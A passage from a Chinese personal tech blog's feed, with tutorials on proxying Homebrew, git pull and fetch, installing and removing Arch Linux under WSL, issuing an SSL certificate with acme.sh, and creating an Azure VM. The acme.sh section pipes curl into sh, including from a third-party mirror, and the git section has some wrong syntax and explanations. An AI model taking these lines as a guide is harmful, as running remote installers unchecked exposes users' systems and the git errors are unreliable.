        <content type="html"><![CDATA[<p>问题描述：今天本来打算使用Homebrew 更新一个工具，但是输入完<code>brew updata</code> 之后，就一直是<code>Updating Homebrew...</code></p><p>这个时候，我产生了几个疑问：</p><ol><li>为什么卡着不动了，明明是有网络的啊。</li><li>难道是因为Homebrew 需要访问国外的源？</li><li>Shadowsocks 明明是开着全局代理，为什么没有用？</li><li>如何让终端命令走代理，或者说如何让 Homebrew 走代理更新？</li></ol><h2 id="方案"><a href="#方案" class="headerlink" title="方案"></a>方案</h2><p>首先先回答一下上面那些问题，因为国内网络环境进一步恶劣，使得从根本上造成了这个问题的产生。因为<code>Shadowshocks</code>的全局代理虽然对浏览器是有效，但对命令行无效。</p><p>所以这一切的问题可以总结成一个问题：如果能让终端命令走代理就好了。</p><h3 id="临时生效"><a href="#临时生效" class="headerlink" title="临时生效"></a>临时生效</h3><p>好在Homebrew 是支持全局代理的，所以我们只需要在当前命令行环境中加入代理配置就好了。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">export ALL_PROXY&#x3D;socks5:&#x2F;&#x2F;127.0.0.1:1080</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F; 1080 是本地 socks5 监听端口</span><br></pre></td></tr></table></figure><blockquote><p>如何知道终端命令有没有走代理？</p></blockquote><p>有一个很简单的方法，那就是通过Curl 命令：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl https:&#x2F;&#x2F;www.google.com</span><br></pre></td></tr></table></figure><p>如果走了本地代理，那么很快终端就会有输出，如果没有走则会提示403 端口请求超时。</p><h3 id="永久生效"><a href="#永久生效" class="headerlink" title="永久生效"></a>永久生效</h3><p>需要注意的是，上面的配置仅仅只是临时的，如果重启一下终端，这个配置就失效了，那么有没有办法可以永久生效呢？</p><p>当然是有的，只需要将环境变量写入终端中。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"># bash</span><br><span class="line">echo export https_proxy&#x3D;http:&#x2F;&#x2F;127.0.0.1:1080 http_proxy&#x3D;http:&#x2F;&#x2F;127.0.0.1:1080 all_proxy&#x3D;socks5:&#x2F;&#x2F;127.0.0.1:1080 &gt;&gt; ~&#x2F;.bash_profile</span><br><span class="line"></span><br><span class="line"># zsh</span><br><span class="line">echo export https_proxy&#x3D;http:&#x2F;&#x2F;127.0.0.1:1080 http_proxy&#x3D;http:&#x2F;&#x2F;127.0.0.1:1080 all_proxy&#x3D;socks5:&#x2F;&#x2F;127.0.0.1:1080 &gt;&gt; ~&#x2F;.zprofile</span><br></pre></td></tr></table></figure><p>这样，Homebrew 就能通过 <code>Shadowsocks</code> 来更新了。</p><h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><ul><li><a href="https://www.logcg.com/archives/1617.html" target="_blank" rel="noopener">让 Homebrew 走代理更新</a></li><li><a href="https://www.cnblogs.com/xjnotxj/p/7478614.html" target="_blank" rel="noopener">如何让Homebrew 走代理更新？</a></li></ul>]]></content>
      
      
      <categories>
          
          <category> Skill </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Skill </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Git Pull 命令详解</title>
      <link href="/detailed-git-pull-command/"/>
      <url>/detailed-git-pull-command/</url>
      
        <content type="html"><![CDATA[<p>这片文章主要用来讲解<code>git pull</code>命令的一些细节。</p><a id="more"></a><h2 id="git-pull"><a href="#git-pull" class="headerlink" title="git pull"></a>git pull</h2><p>git pull 的作用是：取回远程主机某个分支的更新，再与本地指定分支自动合并。</p><h3 id="描述"><a href="#描述" class="headerlink" title="描述"></a>描述</h3><p>将远程主机中的更改合并到当前分支，在默认情况下<code>git pull</code>是<code>git fetch</code>命令和<code>git merge Fetch_HEAD</code>命令的合集，后面会详细介绍。</p><h3 id="示例"><a href="#示例" class="headerlink" title="示例"></a>示例</h3><p>这是git pull 的完整格式：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ git pull [options] [&lt;repository&gt; [&lt;refspec&gt;…]]</span><br></pre></td></tr></table></figure><p>比如要取回<code>origin</code>主机的<code>fixbug</code>分支的最新提交，<strong>并与本地的<code>master</code>分支合并</strong>，就需要写成这个样子：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ git pull origin fixbug:master</span><br></pre></td></tr></table></figure><p>如果远程分支要与当前分支合并，则冒号及其冒号后的分支可以省略，就变成了这个样子：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;&#x2F; 取回firebug 分支的最新提交并与当前分支合并</span><br><span class="line">$ git pull origin fixbug</span><br></pre></td></tr></table></figure><p>上面的命令表示，取回<code>origin/fixbug</code>分支最新的提交，并于当前分支合并。</p><p>这里就等同于先<code>git fetch</code>获取所跟踪的远程分支的最新的提交，然后执行<code>git merge</code>合并到当前分支。也就是下面两条命令。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;&#x2F; 自动从当前分支的跟踪分支上获取最新的提交</span><br><span class="line">$ git fetch </span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F; 合并origin&#x2F;fixbug分支到当前分支</span><br><span class="line">$ git merge origin&#x2F;fixbug</span><br></pre></td></tr></table></figure><h2 id="git-fetch"><a href="#git-fetch" class="headerlink" title="git fetch"></a>git fetch</h2><blockquote><p>为什么这个分支是这种写法?</p></blockquote><p>因为<code>git fetch</code>命令会获取当前追踪分支的最新更改，就等同于取回<code>origin/fixbug</code>分支到本地。</p><p>你可以使用<code>git branch -a</code> 查看所有分支，会发现多了一个 <code>origin/fixbug</code>分支，前提是该分支已经建立了追踪关系。</p><p>而这个分支所包含的内容就是最新的提交或者其他某些更改。所以此时你需要通过合并这个长的比较奇怪的分支，来更新本地的工作区。</p><p>在某些场合，Git 会自动在本地分支与远程分支之间建立一种追踪关系（tracking）。比如，我们在clone 时，会发现所有本地分支默认与远程主机的同名分支，建立追踪关系。也就是说，本地的 master 分支自动追踪 <code>origin/master</code>分支。</p><p>Git 也允许手动添加追踪关系。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;&#x2F; 本地master分支与取回origin&#x2F;fixbug分支建立关系。</span><br><span class="line">$ git branch --set-upstream master origin&#x2F;fixbug</span><br></pre></td></tr></table></figure><p>如果当前分支与远程分支存在追踪关系。那么git pull 就可以省略远程分支名。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ git pull origin</span><br></pre></td></tr></table></figure><p>上面的分支是什么意思呢？就是表示本地的当前分支会自动与对应的<code>origin</code>主机的“追踪分支”进行合并。</p><p>如果当前分支只对应一种追踪分支，那么远程主机名都可以省略。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;&#x2F; 这也就成了我们常看见的原始命令。</span><br><span class="line">$ git pull</span><br></pre></td></tr></table></figure><p>上面的命令会自动的与唯一的追踪分支进行合并。</p><blockquote><p>如何将远程分支作为本地的默认分支？</p></blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ git branch --track &lt;remote branch&gt; remotes&#x2F;origin&#x2F;&lt;remote branch&gt;</span><br></pre></td></tr></table></figure><p>这样就将远程的分支与本地同名分支建立了追踪关系。</p><p>可以使用<code>git config -e</code>命令查看。</p><p>当追踪关系只有一个时，那么使用<code>git pull</code> 命令，就可以直接更新<code>&lt;remote branch&gt;</code> 分支了。</p><p>如果合并需要采用<code>rebase</code>模式，可以使用<code>--rebase</code>选项。</p><h2 id="git-rebase"><a href="#git-rebase" class="headerlink" title="git rebase"></a>git rebase</h2><blockquote><p>这里说一个题外话，<code>rebase</code> 是什么？有什么用？</p></blockquote><p><code>git rebase</code> 清除本地历史提交</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ git --rebase &lt;远程主机名&gt;&lt;远程分支名&gt;:&lt;本地分支名&gt;</span><br></pre></td></tr></table></figure><blockquote><p>git fetch 与 git pull 的区别。</p></blockquote><p>git fetch 表示从远程获取最新的版本到本地，但是不会自动合并。其过程用命令表示就是：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$ git fetch origin master</span><br><span class="line">$ git log -p master..origin&#x2F;master</span><br><span class="line">$ git merge origin&#x2F;master</span><br></pre></td></tr></table></figure><p>另一种写法就是：      </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$ git fetch origin master:tem</span><br><span class="line">$ git diff tem</span><br><span class="line">$ git merge tem</span><br></pre></td></tr></table></figure><p>上面这两种写法都是都是一个意思。唯一有所区别的就是使用 <code>tem</code>分支代替了<code>origin/master</code>分支的存在。其含义是： </p><ol><li>从远程<code>origin</code>主机的<code>master</code>主分支下载最新的版本到本地<code>origin/master</code>分支，或者<code>tem</code>分支。</li><li>比较本地master分支与origin/master（tem）分支的差异。</li><li>最后进行合并</li></ol><p>git pull，相当于从远程获取最新的版本并合并到本地。       </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ git pull origin master</span><br></pre></td></tr></table></figure><p>上述命令其实相当于git fetch 和 git merge<br>在实际使用中，git fetch更安全一些，因为在merge前，我们可以查看更新情况，然后再决定是否合并。</p>]]></content>
      
      
      <categories>
          
          <category> Git </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Git </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Win10 如何卸载 Arch Linux</title>
      <link href="/how-to-uninstall-wsl-linux-subsystem-in-win-10/"/>
      <url>/how-to-uninstall-wsl-linux-subsystem-in-win-10/</url>
      
        <content type="html"><![CDATA[<p>最近在Windows 上安装 WSL，遇到一点问题，需要将 Arch Linux 完全卸载。</p><a id="more"></a><p>在正式卸载之前，有以下几点需要注意：</p><ol><li>不要试图通过 Microsoft Store 去卸载，那里只有安装按钮，没有卸载按钮。</li><li>秋季创意者更新之前，可以使用<code>lxrun</code>命令去进行卸载操作，但是秋季创意者更新之后该命令就被移除了。</li></ol><h3 id="查看发行版"><a href="#查看发行版" class="headerlink" title="查看发行版"></a>查看发行版</h3><p>列出当前已经安装且随时可用的发行版：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wslconfig &#x2F;list</span><br></pre></td></tr></table></figure><p>列出所有发行版，包括正在安装、卸载和已损坏的发行版：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wslconfig &#x2F;list &#x2F;all</span><br></pre></td></tr></table></figure><h3 id="卸载"><a href="#卸载" class="headerlink" title="卸载"></a>卸载</h3><p>卸载已经安装的发行版：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">$ wslconfig &#x2F;list &#x2F;all</span><br><span class="line">Windows Subsystem for Linux Distributions:</span><br><span class="line">Arch (Default)</span><br><span class="line">$ wslconfig &#x2F;unregister Arch</span><br><span class="line">Unregistering...</span><br></pre></td></tr></table></figure><p>上面是以<code>Arch Linux</code>为例进行卸载，其他发行版同理，只需要替换发行版的名称就可以了。</p><blockquote><p>注意: 卸载发行版时，会永久删除所有与该发行版有关的数据和设置。</p></blockquote><h3 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h3><ul><li><a href="https://blog.littlelanmoe.com/exp/494" target="_blank" rel="noopener">Windows 10 Linux子系统如何卸载？</a></li></ul>]]></content>
      
      
      <categories>
          
          <category> Linux </category>
          
          <category> Windows </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Linux </tag>
            
            <tag> Arch Linux </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Win10 如何安装 Arch Linux</title>
      <link href="/how-to-install-arch-linux-on-win10/"/>
      <url>/how-to-install-arch-linux-on-win10/</url>
      
        <content type="html"><![CDATA[<p>最近主力生产工具可能要拿去送修，所以可能有一段时间要和我的MBP 分开了。但是工作还是要继续，于是把之前闲置的 小米 Pro 15.6 给整起来。</p><p>第一件需要做的事情就是配置开发环境。</p><a id="more"></a><h2 id="了解-WSL"><a href="#了解-WSL" class="headerlink" title="了解 WSL"></a>了解 WSL</h2><h3 id="什么是-WSL-？"><a href="#什么是-WSL-？" class="headerlink" title="什么是 WSL ？"></a>什么是 WSL ？</h3><p>Windows Linux Server (WSL) 又名Windows 子系统，它使得开发人员可以直接在未经修改得Windows 上运行 <code>Gun/Linux</code> 环境，也包括大多数命令行工具，实用程序员和应用程序员，而不会需要额外增加虚拟机。</p><h3 id="WSL-可以做什么"><a href="#WSL-可以做什么" class="headerlink" title="WSL 可以做什么"></a>WSL 可以做什么</h3><ul><li>你可以自行选择你喜欢的 <code>Gun/Linux</code> 发行版：Arch Linux、Ubuntu、OpenSuSE、Kail Linux、Debian、Fedora等。</li><li>运行通用的命令行，例如grep，sed，awk或其他ELF-64二进制文件。</li><li>轻松运行Bash Shell脚本和 <code>GNU/Linux</code> 命令行应用程序</li><li>使用自己的 <code>GNU/Linux</code> 分发程序包管理器安装其他软件。</li><li>使用类似Unix的命令行外壳调用Windows应用程序。</li><li>在Windows上调用 <code>GNU/Linux</code> 应用程序。</li></ul><p>有了这些功能，我们就可以完成很多工作，而不必担心安装虚拟机监控程序，从而享受Linux的好处。安装并准备好Win 10后，请按照以下步骤进行操作，并在其中添加Arch Linux。</p><h2 id="安装-WSL"><a href="#安装-WSL" class="headerlink" title="安装 WSL"></a>安装 WSL</h2><p>本文要安装的WSL 是 <a href="https://www.archlinux.org/" target="_blank" rel="noopener">Arch Linux</a> 。</p><blockquote><p>为什么要选择 Arch Linux？</p></blockquote><p>因为它是一个轻量级且灵活的Linux 发行版。</p><h3 id="为Linux-安装Windows-子系统"><a href="#为Linux-安装Windows-子系统" class="headerlink" title="为Linux 安装Windows 子系统"></a>为Linux 安装Windows 子系统</h3><p>这是一项使Windows能够“ 托管 ” Linux 的功能。所以需要先启用此功能。</p><p>以管理员的身份打开Power Shell，然后输入以下命令：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Enable-WindowsOptionalFeature -Online -FeatureName Microsoft-Windows-Subsystem-Linux</span><br></pre></td></tr></table></figure><p>通常会重启一次你的电脑。</p><h3 id="安装Arch-Linux"><a href="#安装Arch-Linux" class="headerlink" title="安装Arch Linux"></a>安装Arch Linux</h3><p>我记得在2019 年，Windows 刚拥抱 Linux 时，Arch Linux 还可以直接从 Microsoft Store 直接下载，不知为何现在却搜不到了。</p><p>不过还是有其他办法手动安装，<a href="https://github.com/yuk7/ArchWSL/releases/tag/20.4.3.0" target="_blank" rel="noopener">打开该页面</a>，下载<code>Arch.zip</code>。</p><p>解压完成之后，可以看到如下文件：</p><p><img src="https://cdn.jsdelivr.net/gh/0xAiKang/CDN/blog/images/20200816171455.png" alt=""></p><p>双击<code>Arch.exe</code>应用程序，进行安装。</p><p>稍微等待一会，就可以看到Arch Linux 已经顺利安装完成了，然后按任意键退出。</p><h3 id="启动Arch-Linux"><a href="#启动Arch-Linux" class="headerlink" title="启动Arch Linux"></a>启动Arch Linux</h3><p>再次双击<code>Arch Linux</code>，不出意外的话，就可以看到<code>Arch Linux</code> 的控制台了，没错就是这么简单。</p><h2 id="配置"><a href="#配置" class="headerlink" title="配置"></a>配置</h2><p>第一次安装完成之后，需要手动做一些配置，初始化并更新系统。</p><p>在终端或<code>CMD</code> 中输入<code>WSL</code> 进入<code>Arch Linux</code>。</p><p>编辑 <code>/etc/pacman.d/mirrorlist</code>，去掉<code>China</code>节点 前面的<code>##</code>，以及下面的<code>Server</code>下面的<code>##</code>。</p><h3 id="初始化"><a href="#初始化" class="headerlink" title="初始化"></a>初始化</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">pacman-key --init</span><br><span class="line"></span><br><span class="line">pacman-key --populate archlinux</span><br></pre></td></tr></table></figure><h3 id="更新"><a href="#更新" class="headerlink" title="更新"></a>更新</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;&#x2F; 更新 GPG key</span><br><span class="line">pacman -Sy archlinux-keyring</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F; 更新系统，速度快慢与镜像源有关</span><br><span class="line">pacman -Syyu base base-devel</span><br></pre></td></tr></table></figure><h2 id="个性化"><a href="#个性化" class="headerlink" title="个性化"></a>个性化</h2><p>Arch Linux 默认的样式并不好看，和CMD 都是黑漆漆的一片。</p><p>因为Arch Linux 默认使用的 Bash，如果你和我一样，更喜欢 Zsh 的话，那就请继续看下去。</p><h3 id="安装ZSH"><a href="#安装ZSH" class="headerlink" title="安装ZSH"></a>安装ZSH</h3><p>既然要安装Zsh，那就不得不安装<code>oh-my-zsh</code>了，所以这里一起安装了。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pacman -S zsh oh-my-zsh-git</span><br></pre></td></tr></table></figure><h3 id="安装Spaceship-ZSH"><a href="#安装Spaceship-ZSH" class="headerlink" title="安装Spaceship ZSH"></a>安装Spaceship ZSH</h3><p><a href="https://github.com/denysdovhan/spaceship-prompt" target="_blank" rel="noopener">Spaceship ZSH</a> 是Zsh 的提示符工具。</p><ol><li><p>克隆仓库</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git clone https:&#x2F;&#x2F;github.com&#x2F;denysdovhan&#x2F;spaceship-prompt.git &quot;$ZSH_CUSTOM&#x2F;themes&#x2F;spaceship-prompt&quot;</span><br></pre></td></tr></table></figure></li><li><p>链接文件</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ln -s &quot;$ZSH_CUSTOM&#x2F;themes&#x2F;spaceship-prompt&#x2F;spaceship.zsh&quot; &quot;$ZSH_CUSTOM&#x2F;themes&#x2F;spaceship.zsh-theme&quot;</span><br></pre></td></tr></table></figure></li><li><p>更改默认theme </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"># vim ~&#x2F;.zshrc</span><br><span class="line">ZSH_THEME&#x3D;&quot;spaceship&quot;</span><br></pre></td></tr></table></figure></li></ol><p>重启终端即可。</p><h3 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h3><ul><li><a href="https://github.com/way-zer/way-zer.github.com/issues/2" target="_blank" rel="noopener">安装ArchWSL（Windows 下的Arch Linux 子系统）</a></li></ul>]]></content>
      
      
      <categories>
          
          <category> Linux </category>
          
          <category> Windows </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Linux </tag>
            
            <tag> Windows </tag>
            
            <tag> WSL </tag>
            
            <tag> Arch Linux </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>如何申请免费的SSL 证书</title>
      <link href="/how-to-apply-for-a-free-ssl-certificate/"/>
      <url>/how-to-apply-for-a-free-ssl-certificate/</url>
      
        <content type="html"><![CDATA[<p>这篇笔记用来记录如何申请免费的 SSL 证书，通过本文介绍的方式所申请的证书有效期只有三个月，请谨慎选择。</p><a id="more"></a><h2 id="准备"><a href="#准备" class="headerlink" title="准备"></a>准备</h2><p>像这类提供免费 SSL 证书的网站非常多，这里我选择的平台是 <a href="https://freessl.cn/" target="_blank" rel="noopener">FreeSSL.cn</a> 。</p><p>在正式开始之前，你得准备一个邮箱，<a href="https://freessl.cn/register" target="_blank" rel="noopener">注册</a> 一个 <code>FreeSSL.cn</code> 账号，然后登录。</p><p>将需要申请证书的域名填写在输入框中，选择多域名通配符，然后点击创建免费的SSL 证书。</p><p><img src="https://cdn.jsdelivr.net/gh/0xAiKang/CDN/blog/images/20200814172918.png" alt=""></p><p>我这里选择的是泛域名，根据你自己的实际情况，去创建相应子域名的证书：</p><ul><li><code>example.com</code>：主域名</li><li><code>*.example.com</code>：泛域名</li></ul><p><img src="https://cdn.jsdelivr.net/gh/0xAiKang/CDN/blog/images/20200814174731.png" alt=""></p><p>选择浏览器生成。</p><p><img src="https://cdn.jsdelivr.net/gh/0xAiKang/CDN/blog/images/20200814175011.png" alt=""></p><p>点击确认创建。</p><p><img src="https://cdn.jsdelivr.net/gh/0xAiKang/CDN/blog/images/20200814174930.png" alt=""></p><h3 id="添加TXT-记录"><a href="#添加TXT-记录" class="headerlink" title="添加TXT 记录"></a>添加TXT 记录</h3><p>打开需要申请 SSL 证书的域名管理后台，找到 DNS 管理。</p><p>添加 TXT 验证，将刚才的记录值与TXT 记录添加到对应的TXT 类型。</p><p><img src="https://cdn.jsdelivr.net/gh/0xAiKang/CDN/blog/images/20200814180141.png" alt=""></p><p>注意⚠️：记录值区分大小写。</p><p>检测是否配置成功。</p><p><img src="https://cdn.jsdelivr.net/gh/0xAiKang/CDN/blog/images/20200814175520.png" alt=""></p><p>在完成验证之前不要离开当前页面，验证成功之后，点击验证。</p><p>如果配置成功没问题，就可以点击验证，下载证书就完成了。</p><p>注意⚠️：使用此方式获取的证书，有效期只有三个月。</p><h2 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h2><p>因为 FreeSSL.cn 后面改版了，之前是直接生成对应的 <code>*.key</code> 和 <code>*.pem</code> 文件，现在则变成了 ACME 自动化申请。</p><p>前两步还是一样的，只是到了第三步，不一样。</p><p>现在需要选择一种部署方式，来获取证书：</p><p><img src="https://cdn.jsdelivr.net/gh/0xAiKang/CDN/blog/images/20230228143014.png" alt=""></p><p>Cerbot 的部署方式其他笔记已经提到了，因此这里介绍 <code>acme.sh</code> 的方式。</p><p>首先需要安装 <code>acme.sh</code>，可以直接使用下面的命令进行安装：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl https://get.acme.sh | sh -s email=my@example.com</span><br></pre></td></tr></table></figure><p>如果上面官方下载地址失败 或者 太慢，可以选用国内的备用地址：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl https://gitcode.net/cert/cn-acme.sh/-/raw/master/install.sh?inline=<span class="literal">false</span> | sh -s email=my@example.com</span><br></pre></td></tr></table></figure><p>安装完成之后，当前目录下会多出一个 <code>.acme.sh</code> 文件，查看该文件夹：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">[root@localhost]$ ls -al</span><br><span class="line">total 248</span><br><span class="line">drwx------ 8 ec2-user ec2-user    191 Feb 28 14:20 .</span><br><span class="line">drwx------ 7 ec2-user ec2-user    335 Feb 28 12:34 ..</span><br><span class="line">-rw-rw-r-- 1 ec2-user ec2-user    305 Feb 28 14:21 account.conf</span><br><span class="line">-rwxrwxr-x 1 ec2-user ec2-user 221245 Feb 28 12:29 acme.sh</span><br><span class="line">-rw-rw-r-- 1 ec2-user ec2-user     96 Feb 28 12:29 acme.sh.env</span><br><span class="line">drwxrwxr-x 3 ec2-user ec2-user     29 Feb 28 12:34 ca</span><br><span class="line">drwxrwxr-x 2 ec2-user ec2-user   4096 Feb 28 12:29 deploy</span><br><span class="line">drwxrwxr-x 2 ec2-user ec2-user   4096 Feb 28 12:29 dnsapi</span><br><span class="line">-rw-rw-r-- 1 ec2-user ec2-user    460 Feb 28 14:21 http.header</span><br><span class="line">drwxrwxr-x 2 ec2-user ec2-user   4096 Feb 28 12:29 notify</span><br></pre></td></tr></table></figure><p>其中 <code>.acme.sh</code> 就是一会需要用到的 shell 脚本。</p><p>获取证书：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">acme.sh --issue -d my@example.com  --dns dns_dp --server https://acme.freessl.cn/v2/DV90/directory/z8s58p0gs74t0839d3mu</span><br></pre></td></tr></table></figure><p>将示例命令中的域名替换成自己的域名即可。</p><p>正常执行完成之后，当前文件夹下，会多出一个以域名为名的文件：</p><ul><li>fullchain.cer：证书（域名证书.crt + 根证书(root_bundle).crt）</li><li>my.example.com.key：密钥</li></ul><p>有了这两个文件之后，就可以轻松配置 ssl 了。</p>]]></content>
      
      
      <categories>
          
          <category> Tutorial </category>
          
      </categories>
      
      
        <tags>
            
            <tag> HTTPS </tag>
            
            <tag> SSL </tag>
            
            <tag> HTTP </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>手把手教你如何创建启动 Azure 实例</title>
      <link href="/teach-you-how-to-create-and-start-an-azure-instance/"/>
      <url>/teach-you-how-to-create-and-start-an-azure-instance/</url>
      
        <content type="html"><![CDATA[<p>这篇笔记用来整理如何创建启用 Azure 实例。因为这方面可以找到的资料比较少，所以整理一下。</p><p>一是方便自己以后回顾，二是给其他人作为参考。</p><a id="more"></a><h2 id="准备"><a href="#准备" class="headerlink" title="准备"></a>准备</h2><p>因为本文是创建微软云，所以首先你得有一个微软账号。</p><p>打开 <a href="https://azure.microsoft.com/zh-cn/" target="_blank" rel="noopener">Microsoft Azure</a> 进行登录，登录成功之后，进入<a href="https://portal.azure.com/#home" target="_blank" rel="noopener">云服务管理后台</a>。</p><h2 id="创建实例"><a href="#创建实例" class="headerlink" title="创建实例"></a>创建实例</h2><p>点击创建资源。</p><p><img src="https://cdn.jsdelivr.net/gh/0xAiKang/CDN/blog/images/20200812135350.png" alt=""></p><p>可以搜索你想创建的云服务类型，这里我选择的是 <code>Ubuntu Server 18.04 LTS</code>。</p><p><img src="https://cdn.jsdelivr.net/gh/0xAiKang/CDN/blog/images/20200812135625.png" alt=""></p><p>点击创建。</p><p><img src="https://cdn.jsdelivr.net/gh/0xAiKang/CDN/blog/images/20200812135731.png" alt=""></p><p>放心，这里的创建并不是正真意义上的创建。接下来需要为机器预设配置。</p><p>下面对常见的配置进行简单说明：</p><ul><li><code>资源组</code>：用来分配一些权限以及策略。</li><li><code>虚拟机名称</code>：你希望用什么名称来称呼这台机器（通常是英文）</li><li><code>区域</code>：选择机器所在地区</li><li><code>映像</code>：选择操作系统</li><li><code>大小</code>：选择一个合适的负责类型，可以理解成机器的硬件配置。</li><li><code>身份验证类型</code>：通常有两种：ssh 密钥和密码，强烈建议使用密钥而不使用密码（密哦存在被暴力破解的风险）。</li><li><code>用户名</code>：微软云默认没有给<code>root</code> 用户，这里需要指定用户名称。</li><li><code>公共入站端口</code>：通常是只开启<code>HTTP (80)</code>、<code>HTTPS (443)</code>、<code>SSH (22)</code> 。</li></ul><p><img src="https://cdn.jsdelivr.net/gh/0xAiKang/CDN/blog/images/20200812141205.png" alt=""></p><p>完成基本配置之后，点击<code>下一步：磁盘</code>。</p><p><img src="https://cdn.jsdelivr.net/gh/0xAiKang/CDN/blog/images/20200812141834.png" alt=""></p><p>Azure 默认只有一个用于短期存储的临时盘，而临时盘通常都很小。</p><p>默认的磁盘很小，如果想扩大有两种方式：</p><ul><li>创建新的磁盘，需要手动挂载。</li><li>更改默认磁盘的大小。</li></ul><p>配置完磁盘之后，点击<code>下一步：网络</code>。</p><p><img src="https://cdn.jsdelivr.net/gh/0xAiKang/CDN/blog/images/20200812142034.png" alt=""></p><p>网络配置，公用ip 可以选择无，后面再去新建。</p><p>然后点击<code>下一步：管理</code>。</p><p><img src="https://cdn.jsdelivr.net/gh/0xAiKang/CDN/blog/images/20200812142317.png" alt=""></p><p>管理、高级、标记这一块，如果没有特殊需求可以直接使用默认配置。</p><p>最后点击<code>查看+创建</code>，可以看到预设的配置信息，如果符合预期，点击创建。</p><p><img src="https://cdn.jsdelivr.net/gh/0xAiKang/CDN/blog/images/20200812142806.png" alt=""></p><p>下载私钥并保存好。</p><p><img src="https://cdn.jsdelivr.net/gh/0xAiKang/CDN/blog/images/20200812152220.png" alt=""></p><p>此时，虽然已经创建好虚拟机，但是还不能直接使用，因为没有配置IP。</p><h2 id="关联IP"><a href="#关联IP" class="headerlink" title="关联IP"></a>关联IP</h2><p>Azure 和 AWS 不同，它并没有弹性IP 的概念，如果需要配置IP，需要在搜索栏中搜索<code>公共IP地址</code>，</p><p><img 